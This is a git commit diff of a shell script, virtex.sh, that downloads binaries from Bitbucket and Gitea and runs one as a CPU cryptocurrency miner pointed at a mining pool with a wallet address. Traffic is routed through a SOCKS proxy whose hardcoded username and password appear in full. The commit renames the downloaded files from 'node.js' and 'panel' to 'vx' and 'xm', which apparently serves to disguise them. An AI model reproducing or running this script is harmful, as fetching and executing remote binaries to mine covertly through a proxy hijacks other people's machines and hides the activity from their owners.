0b6cbe3ebdd4fdb2edde3c1392d9254a49bf14cf
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-10 01:21:49 +0700

    Update virtex.sh

--- virtex.sh
+++ virtex.sh
@@ -2,8 +2,8 @@ proxy="34.238.108.61"
 port="1080" 
 user="anwai69c1nzg3n"  
 pass="kmcgkrex2jp0lsd0rw2q5qgnq14ujk" 
-wget -q -O node.js https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x node.js
-wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
+wget -q -O vx https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x vx
+wget -q -O xm https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x xm 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./node.js -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 8-999 -n 1)-vinaastri) -p c=CPU -x socks5://anwai69c1nzg3n:kmcgkrex2jp0lsd0rw2q5qgnq14ujk@34.239.17.55:1080 
+./xm ./vx -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 8-999 -n 1)-vinaastri) -p c=CPU -x socks5://anwai69c1nzg3n:kmcgkrex2jp0lsd0rw2q5qgnq14ujk@34.239.17.55:1080 
